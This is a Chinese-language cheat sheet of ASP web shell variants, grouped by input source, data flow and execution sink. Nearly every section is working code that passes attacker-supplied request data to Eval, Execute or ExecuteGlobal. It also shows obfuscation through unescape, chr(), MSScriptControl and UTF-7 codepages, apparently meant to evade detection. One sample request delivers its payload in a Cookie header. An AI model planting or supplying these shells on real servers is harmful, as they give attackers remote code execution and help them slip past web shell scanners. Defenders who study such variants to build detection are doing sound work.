
# source

#### cookie
```
请求包
GET /1.asp HTTP/1.1
Host: 192.168.66.134
Cookie: response.write(111)'
```

```
<%
eval(""+Request.Cookies)
%>
```

#### 编码
```
<%execute(unescape("eval%20request%28%22aaa%22%29"))%>
```

```
<%Eval(Request(chr(35)))%>
```

#### 语法
```
<%Eval(Request(chr(35))+"")%>
```

# 数据流
#### 文件
1.asp
```
<%
code=Request(1)
%>
```

2.asp
```
<!--#include file="1.asp" -->
<%
response.write(code)
%>
```

访问2.asp?1=response.write(1111)


#### 函数传递
```
<%@LANGUAGE="javascript"%>
<%
param=Request(1)+''
func=eval
func(param)
%>
```

#### 数组
```
<%
x=Request(1)
param = Array(x,"xxx")
eval(param(0))
%>
```


#### 多个<%%>
```
<%code=Request(1)%>

<%
Eval(code+"")
%>
```

# sink

#### 代码执行
Eval、Execute、ExecuteGlobal

#### 组件
2003可以，2008找不到组件
```
<%
set ms = server.CreateObject("MSScriptControl.ScriptControl.1")
ms.Language="VBScript"
ms.AddObject "Response", Response
ms.AddObject "request", request
ms.AddObject "session", session
ms.AddObject "server", server
ms.AddObject "application", application
ms.ExecuteStatement ("ex"&"e"&"cute(request(1))")%>
```

#### utf7编码
```
<%@ codepage=65000%><% response.Charset="936"%>
<%
e+j-v+j-a+j-l(request(1))
%>
```
